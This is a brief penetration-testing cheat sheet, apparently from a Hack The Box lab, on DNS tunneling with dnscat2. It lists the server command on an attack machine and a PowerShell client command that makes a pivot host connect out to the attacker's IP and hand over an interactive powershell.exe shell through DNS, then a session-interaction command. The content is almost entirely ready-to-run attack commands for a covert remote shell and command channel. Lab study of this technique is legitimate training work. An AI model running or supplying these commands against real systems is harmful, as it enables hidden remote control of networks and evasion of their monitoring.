# DNS Tunneling

## [Server](https://github.com/iagox86/dnscat2) on Attack Machine

```sh
my@attack:~/dnscat2/server$ sudo ruby dnscat2.rb --dns host=10.10.15.109,port=53,domain=INLANEFREIGHT.LOCAL --no-cache
```

## [Client](https://github.com/lukebaggett/dnscat2-powershell) on Pivot

```pwsh
PS C:\Users\htb-student> Start-Dnscat2 -DNSServer 10.10.15.109 -Domain INLANEFREIGHT.LOCAL -PreSharedSecret e8af8d441d816abc5f123ed63cdd5288 -Exec "powershell.exe"
```

## Session Interaction

```sh
dnscat2> window -i 1
```
